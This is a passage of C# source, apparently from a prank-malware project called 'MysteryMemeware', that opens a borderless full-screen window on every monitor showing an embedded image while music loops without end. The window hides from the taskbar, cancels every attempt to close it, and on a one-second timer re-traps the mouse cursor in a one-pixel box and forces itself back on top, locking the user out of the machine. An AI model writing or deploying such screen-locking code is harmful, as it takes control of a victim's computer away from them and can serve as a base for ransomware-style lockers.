                System.Threading.Thread thread = new System.Threading.Thread(() =>
                {
                    System.Drawing.Image coverImage = System.Drawing.Image.FromStream(typeof(Program).Assembly.GetManifestResourceStream("MysteryMemeware.CoverImage.bmp"));
                    System.Windows.Forms.Form form = new MainForm(localScreenIndex, coverImage);
                    form.ShowDialog();
                });
                thread.Start();
            }

            System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer(typeof(Program).Assembly.GetManifestResourceStream("MysteryMemeware.Music.wav"));
            while (true)
            {
                soundPlayer.PlaySync();
            }
        }
        private sealed class MainForm : System.Windows.Forms.Form
        {
            public MainForm(int screenID, System.Drawing.Image coverImage)
            {
                this.BackColor = System.Drawing.Color.White;

                this.ShowInTaskbar = false;

                this.TopMost = true;
                this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;

                this.StartPosition = System.Windows.Forms.FormStartPosition.Manual;

                System.Windows.Forms.Screen screen = System.Windows.Forms.Screen.AllScreens[screenID];

                this.Location = screen.Bounds.Location;
                this.Width = screen.Bounds.Width;
                this.Height = screen.Bounds.Height;

                CustomPictureBox pictureBox = new CustomPictureBox();

                double targetAspectRatio = coverImage.Width / (double)coverImage.Height;

                double viewPortWidth = screen.Bounds.Width;
                double viewPortHeight = screen.Bounds.Height;

                double renderWidth = viewPortHeight * targetAspectRatio;
                double renderHeight = viewPortWidth / targetAspectRatio;

                if (renderWidth > viewPortWidth)
                {
                    renderWidth = viewPortWidth;
                }
                if (renderHeight > viewPortHeight)
                {
                    renderHeight = viewPortHeight;
                }

                double renderX = (viewPortWidth - renderWidth) / 2;
                double renderY = (viewPortHeight - renderHeight) / 2;

                pictureBox.Location = new System.Drawing.Point((int)renderX, (int)renderY);
                pictureBox.Width = (int)renderWidth;
                pictureBox.Height = (int)renderHeight;

                pictureBox.Image = coverImage;
                pictureBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;

                this.Controls.Add(pictureBox);

                this.FormClosing += OnFormClosing;

                this.Load += OnFormLoad;

                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
                this.TopMost = true;
            }

            private void OnFormLoad(object sender, System.EventArgs e)
            {
                System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
                timer.Tick += OnTimerTick;
                timer.Interval = 1000;
                timer.Start();

                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
                this.TopMost = true;
            }
            private void OnTimerTick(object sender, System.EventArgs e)
            {
                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
                this.TopMost = true;
            }
            private void OnFormClosing(object sender, System.Windows.Forms.FormClosingEventArgs e)
            {
                e.Cancel = true;
            }
            private sealed class CustomPictureBox : System.Windows.Forms.PictureBox
            {
                protected override void OnPaint(System.Windows.Forms.PaintEventArgs paintEventArgs)
                {
                    paintEventArgs.Graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor;
                    base.OnPaint(paintEventArgs);
                }
            }
        }
    }
}